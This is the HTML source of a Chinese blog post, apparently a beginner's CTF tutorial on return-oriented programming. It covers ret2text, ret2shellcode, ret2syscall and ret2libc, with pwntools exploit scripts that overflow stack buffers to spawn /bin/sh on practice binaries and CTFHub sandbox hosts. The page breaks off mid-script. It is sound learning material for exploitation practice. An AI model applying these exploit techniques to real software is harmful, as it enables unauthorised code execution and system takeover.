@@ -1,0 +1,838 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" href="/img/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Modifier">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="栈上的简单小玩意们">
+<meta property="og:type" content="article">
+<meta property="og:title" content="真的很菜菜的ROP">
+<meta property="og:url" content="https://shmodifier.github.io/2023/06/21/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/index.html">
+<meta property="og:site_name" content="Modifier">
+<meta property="og:description" content="栈上的简单小玩意们">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://shmodifier.github.io/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/%E9%A1%B5%E9%A6%96%E5%9B%BE.jpg">
+<meta property="article:published_time" content="2023-06-21T07:22:03.000Z">
+<meta property="article:modified_time" content="2023-06-21T07:40:32.475Z">
+<meta property="article:author" content="Modifier">
+<meta property="article:tag" content="Knowledge">
+<meta property="article:tag" content="栈">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://shmodifier.github.io/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/%E9%A1%B5%E9%A6%96%E5%9B%BE.jpg">
+  
+  
+  
+  <title>真的很菜菜的ROP - Modifier</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"shmodifier.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":false,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Have a nice day!</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/%E9%A1%B5%E9%A6%96%E5%9B%BE.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="真的很菜菜的ROP"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-06-21 15:22" pubdate>
+          2023年6月21日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          62 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">真的很菜菜的ROP</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>栈上的简单小玩意们</p>
+<span id="more"></span>
+
+<hr>
+<p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming，面向返回编程），其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段( gadgets )来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong></p>
+<p>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
+<p><strong>实施ROP的条件</strong></p>
+<ul>
+<li>程序存在栈溢出，且可以控制返回地址</li>
+<li>可以找到满足程序的 gadgets 以及相应的 gadgets 的地址</li>
+</ul>
+<blockquote>
+<p>都是copy来的）看到有的人说这个叫“面向返回地址”编程哈哈。</p>
+</blockquote>
+<h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p>ret2text 即控制程序执行程序本身已有的的代码(.text)，比如<code>system(&quot;/bin/sh&quot;)</code>或者<code>system(&quot;cat flag&quot;)</code>。我们需要做的就是把这些代码段的调用地址覆盖到返回地址上。</p>
+<p>我们在控制程序执行的时候也可以控制程序执行好几段不相邻的已有代码，这是我们需要知道对应返回的代码的位置。程序如果开启了某些保护，我们就需要想办法去绕过它。</p>
+<h4 id="🌰-1"><a href="#🌰-1" class="headerlink" title="🌰_1:"></a>🌰_1:</h4><p>点击下载: <a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a></p>
+<p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-25_17-14-08.png" srcset="/img/loading.gif" lazyload></p>
+<p>使用ida反编译main函数，发现gets()语句，可以利用栈溢出</p>
+<p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-25_17-30-17.png" srcset="/img/loading.gif" lazyload></p>
+<p>而后我们在secure中可以找到调用<code>system(&#39;&quot;/bin/sh&quot;)</code>的代码，如果我们控制程序返回到这个指令，就可以获得系统的shell</p>
+<p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-25_17-31-37.png" srcset="/img/loading.gif" lazyload></p>
+<p>查看代码地址为0x0804863A，接下来构造playload。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2text&#x27;</span>)<br>target = <span class="hljs-number">0x804863a</span><br>sh.sendline(<span class="hljs-string">&#x27;A&#x27;</span> * (<span class="hljs-number">0x6c</span>+<span class="hljs-number">4</span>) + p32(target))<br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="🌰-2"><a href="#🌰-2" class="headerlink" title="🌰_2:"></a>🌰_2:</h4><p>来自CTFHUB的ret2text ，我不知道怎么复制题目链接，自己点进去找叭<a target="_blank" rel="noopener" href="https://www.ctfhub.com/#/skilltree">CTFHub</a></p>
+<p>查看文件信息</p>
+<p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_14-47-25.png" srcset="/img/loading.gif" lazyload></p>
+<p>拖进32位IDA反编译发现main函数存在gets栈溢出漏洞</p>
+<p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_14-51-25.png" srcset="/img/loading.gif" lazyload></p>
+<p>shift+F12打开字符串窗口发现&#x2F;bin&#x2F;sh语句</p>
+<p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_14-56-54.png" srcset="/img/loading.gif" lazyload></p>
+<p>去到对应的语句部分可以发现该程序将&#x2F;bin&#x2F;sh放到了rdi后，并且调用了sysytem</p>
+<p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_15-00-09.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>64位系统中rdi，rsi，rdx，rcx，r8，r9作为调用函数的前6个参数，如果参数多于6个，其余参数放入栈中。与此对比，32位系统中由于寄存器有限，调用函数时参数都放入栈中</p>
+</blockquote>
+<p>找一个变量双击可以看到各个变量对应的虚拟内存地址，构造playload就可以先用0x70个自节填满s变量，再用8个字节填满r，最后加上&#x2F;bin&#x2F;sh的地址。</p>
+<p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_15-06-55.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&#x27;challenge-e20ddfc12b209019.sandbox.ctfhub.com&#x27;</span>, <span class="hljs-number">34749</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x70</span> + <span class="hljs-number">8</span>) + p64(<span class="hljs-number">0x4007B8</span>)<br>io.sendlineafter(<span class="hljs-string">&#x27;Welcome to CTFHub ret2text.Input someting:\n&#x27;</span>, payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>‘+4’ 是因为32位程序要覆盖的ebp是四个字节，64位程序需要覆盖八字节的rbp</p>
+</blockquote>
+<h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><p>就是篡改栈帧上的返回地址为攻击者手动传入的shellcode所在缓冲区地址。我们可以利用pwntools中的shellcraft.sh()编写shellcode。</p>
+<p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p>
+<h4 id="🌰-1-1"><a href="#🌰-1-1" class="headerlink" title="🌰_1:"></a>🌰_1:</h4><p>点击下载题目: <a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></p>
+<p>查看文件信息：</p>
+<p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-15_10-40-56.png" srcset="/img/loading.gif" lazyload></p>
+<p>进入main函数反编译一下：</p>
+<p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-15_10-46-07.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现gets和strncpy存在栈溢出漏洞，但系统没有现成的‘bin&#x2F;sh’指令给我们用。我们要自己写🥲</p>
+<p>那怎么写呢？这时就要请出我们的得力助手pwntools，在pwntools下可以自动生成shellcode脚本。</p>
+<p>gets获得输入的s变量，并将其复制到buf2处。双击buf2可以跳转到其所在位置，我们发现buf2在.bss段，所在段地址为0x0804a080</p>
+<p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-15_10-49-27.png" srcset="/img/loading.gif" lazyload></p>
+<p>调试下程序，看看这一个 bss 段是否可执行，显示rwxp就是可以。</p>
+<p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-15_11-02-42.png" srcset="/img/loading.gif" lazyload></p>
+<p>有权限就意味着我们可以将shellcode通过strncpy函数放进buf2这个区域，在触发溢出后将返回地址指向buf2这里即可拿到shell。</p>
+<p>确定要覆盖的 return address 的偏移量相对于栈顶为 112 个字节。</p>
+<p>EXP:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2shellcode&#x27;</span>)<br><br>shellcode = asm(shellcraft.sh())<br>buf2_addr = <span class="hljs-number">0x804a080</span><br><br>sh.sendline(shellcode.ljust(<span class="hljs-number">112</span>, <span class="hljs-string">b&#x27;A&#x27;</span>) + p32(buf2_addr))<br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="🌰-2-1"><a href="#🌰-2-1" class="headerlink" title="🌰_2:"></a>🌰_2:</h4><p>还是CTFHub的题目。放进ubuntu查看文件信息：</p>
+<p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_20-00-41.png" srcset="/img/loading.gif" lazyload></p>
+<p>NX disabledz，即将shellcode放在数据段，即可执行</p>
+<p>出现了一个新的变量RWX！</p>
+<p>用IDA反编译题目main函数发现栈溢出漏洞</p>
+<p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_20-03-42.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们可以知道buf相对于ebp的偏移量是0x10，所以我们需要填充(0x10+8)的数据。</p>
+<p>双击buf查看程序中的变量信息</p>
+<p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-14_20-33-36.png" srcset="/img/loading.gif" lazyload></p>
+<p>r即为返回地址，有0x8的偏移量，所以总共需要填充的数据长度是 (0x10+0x8+0x8)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&#x27;challenge-a0bc34814de46f67.sandbox.ctfhub.com&#x27;</span>, <span class="hljs-number">37477</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;[&#x27;</span>)<br>buf_address = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&#x27;]&#x27;</span>)[:-<span class="hljs-number">1</span>].decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), <span class="hljs-number">16</span>)<br>log.success(<span class="hljs-string">&#x27;buf_address =&gt; %s&#x27;</span> % <span class="hljs-built_in">hex</span>(buf_address).upper())<br>shellcode_address = buf_address+<span class="hljs-number">0x20</span> <span class="hljs-comment"># buf与rbp的距离0x10 + rbp的宽度0x8 + 返回地址的长度0x8</span><br>log.success(<span class="hljs-string">&#x27;buf_address =&gt; %s&#x27;</span> % <span class="hljs-built_in">hex</span>(shellcode_address).upper())<br>shellcode = asm(shellcraft.sh())<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span> + <span class="hljs-number">4</span>) + p64(shellcode_address) + shellcode<br>io.recv()<br>io.sendline(payload)<br>io.interactive()     <br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这也太深奥了没搞懂，有缘再说</p>
+</blockquote>
+<h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p>ret2syscall即控制程序执行系统调用，从而获取shell。前提是程序需要有int 0x80这样的系统调用的gadget.</p>
+<p>在ret2shellcode的情境下，如果开启了NX，那我们写到栈中的shellcode就会被CPU报错而不可执行。这种情况下，我们可以尝试使用ret2syscall的方法。</p>
+<p>ret2syscall就是指通过手机带有ret指令的指令片段拼接成我们需要的shellcode。</p>
+<blockquote>
+<p>ret 指令可以理解为取栈顶的数据作为下次跳转的位置，即 eip&#x3D;[esp]  esp&#x3D;[esp+4]</p>
+<p>或者理解为 pop eip，jmp   </p>
+<p>取栈顶数据作为下次跳转的位置，然后跳转;</p>
+<p>同理call也可以理解为 push rip, jmp  </p>
+<p>将call指令的下一条指令地址压入栈，然后跳转</p>
+</blockquote>
+<h4 id="🌰"><a href="#🌰" class="headerlink" title="🌰:"></a>🌰:</h4><p> bamboofox 中的 ret2syscall </p>
+<p>首先检测程序开启的保护：</p>
+<p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_15-47-19.png" srcset="/img/loading.gif" lazyload></p>
+<p>查看其源码寻找利用点：</p>
+<p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_15-48-31.png" srcset="/img/loading.gif" lazyload></p>
+<p>main 函数里有 gets 可以实现栈溢出，计算偏移量为112。</p>
+<p>接下来进行系统调用构造，利用ROPgadget查找对应的gadget：</p>
+<p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-23-31.png" srcset="/img/loading.gif" lazyload></p>
+<p>选择0x080bb196的这段</p>
+<p>同样，找到其他的gadgets</p>
+<p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-26-17.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里可以同时控制三个寄存器，我们选它</p>
+<p>选好所有的gadgets就拼接起来构造payload就好喽</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = process(<span class="hljs-string">&#x27;/var/run/vmblock-fuse/blockdir/OMFuQ4/rop&#x27;</span>)  //这文件我直接拖进去的文件地址好长<br><br>pop_edx_ecx_ebx = <span class="hljs-number">0x0806eb90</span><br>binsh = <span class="hljs-number">0x080be408</span><br>pop_eax = <span class="hljs-number">0x080bb196</span><br>int_0x80 = <span class="hljs-number">0x08049421</span><br><br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">112</span>, pop_edx_ecx_ebx, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, binsh,pop_eax, <span class="hljs-number">0xb</span>, int_0x80])<br><br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="关于linux系统调用的实现"><a href="#关于linux系统调用的实现" class="headerlink" title="关于linux系统调用的实现"></a>关于linux系统调用的实现</h4><h5 id="系统调用的步骤"><a href="#系统调用的步骤" class="headerlink" title="系统调用的步骤"></a>系统调用的步骤</h5><p>Linux的系统调用需要通过 int 80 实现，用系统调用号来区分入口函数。操作系统实现调用的基本过程如下：</p>
+<ul>
+<li>应用程序调用库函数</li>
+<li>API将系统调用号存入EAX，然后通过中断调用时系统进入内核态</li>
+<li>内核中的中断处理函数根据系统调用号，调用到对应的内核函数（系统调用）</li>
+<li>系统调用完成相应的功能，将返回值存入EAX，返回到中断处理函数</li>
+<li>中断处理函数返回到API</li>
+<li>API将EAX返回给应用程序</li>
+</ul>
+<blockquote>
+<p>系统调用号：</p>
+<p>在Linux系统中，每个系统调用都被赋予一个系统调用号。系统调用号一旦分配就不能再有任何变更，否则编译好的应用程序就会崩溃；此外，如果一个系统调用被删除，它所占用的系统调用号也不允许被回收利用。这样，通过系统调用号就可以关联系统调用。</p>
+<p>比如32位下调用 execve(“&#x2F;bin&#x2F;sh”,NULL,NULL) ，Linux系统调用通过int 0x80指令开始系统调用，exceve对应的系统调用号是0xb</p>
+</blockquote>
+<h5 id="举个栗子🌰："><a href="#举个栗子🌰：" class="headerlink" title="举个栗子🌰："></a>举个栗子🌰：</h5><p>函数<code>execve(&quot;/bin/sh&quot;,null,null)</code></p>
+<p>其函数调用过程应该是：</p>
+<ul>
+<li>系统调用号存入EAX，即eax应该是0xb</li>
+<li>依次传入三个参数，即ebx指向&#x2F;bin&#x2F;sh的地址或者sh的地址；ecx为0；edx为0</li>
+</ul>
+<p>我们可以知道系统在调用时会用到eax，ebx，ecx，edx四个寄存器，那么我们就可以将以上的内容写为<code>int 0x80(eax,ebx,ecx,edx)</code>。只要把对应的参数放到相应的寄存器中，再执行int 0x80就可以执行相应的系统调用。</p>
+<p>那该怎么控制呢？🤨 <del>把刀架在寄存器脖子上</del></p>
+<p>我们们可以使用pop和ret指令组合来控制寄存器的值以及执行方向。</p>
+<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>ROPgadget和ropper，两个都可可以找，目标汇编代码片段，ROPgadget速度更快但是查找结果并不完整；ropper速度相对较慢但查找结果精准。</p>
+<p>对于静态生成的程序，我们可以不用每一次都一条一条的去找命令，可以直接生成一条ROP链</p>
+<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">ropper</span> <span class="hljs-literal">--</span><span class="hljs-comment">file inndy_rop</span> <span class="hljs-literal">--</span><span class="hljs-comment">chain execverropper</span> <span class="hljs-literal">--</span><span class="hljs-comment">file inndy_rop</span> <span class="hljs-literal">--</span><span class="hljs-comment">chain execve</span><br><span class="hljs-comment">ROPgadget</span> <span class="hljs-literal">--</span><span class="hljs-comment">binary inndy_rop</span> <span class="hljs-literal">--</span><span class="hljs-comment">ropchain</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><p>ret2libc即控制函数执行libc中的函数，通常是返回值某个函数的plt处或者函数的具体位置（即函数对应的got表项的内容）。一般情况下，我们会选择执行 system(“&#x2F;bin&#x2F;sh”)，我们需要知道 system 函数的地址。</p>
+<h4 id="🌰-1-2"><a href="#🌰-1-2" class="headerlink" title="🌰_1:"></a>🌰_1:</h4><p>CTF Wiki 的题，超简单的所有信息都给出的新手题目 <del>我都会做</del></p>
+<p>首先查看安全保护</p>
+<p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-39-30.png" srcset="/img/loading.gif" lazyload></p>
+<p>源程序为 32 位，开启了 NX 保护。看一下程序源代码，确定栈溢出利用位置</p>
+<p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-42-44.png" srcset="/img/loading.gif" lazyload></p>
+<p>gets可以栈溢出。</p>
+<p>我们可以找到system函数和’bin&#x2F;sh’字符串</p>
+<p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-46-14.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-48-21.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们就可以直接返回 system 的地址</p>
+<p>计算偏移量为112，构造payload。需要注意，我们调用system函数，会有一个对应的四字节的返回地址，我们需要将其填充后再附上我们的 ‘&#x2F;bin&#x2F;sh’ 字符串</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = process( <span class="hljs-string">&#x27;/var/run/vmblock-fuse/blockdir/Cm8v0D/ret2libc1&#x27;</span>)<br><br>binsh_addr = <span class="hljs-number">0x8048720</span><br>system_plt = <span class="hljs-number">0x08048460</span><br><br>payload=flat([<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">112</span>, system_plt, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span>, 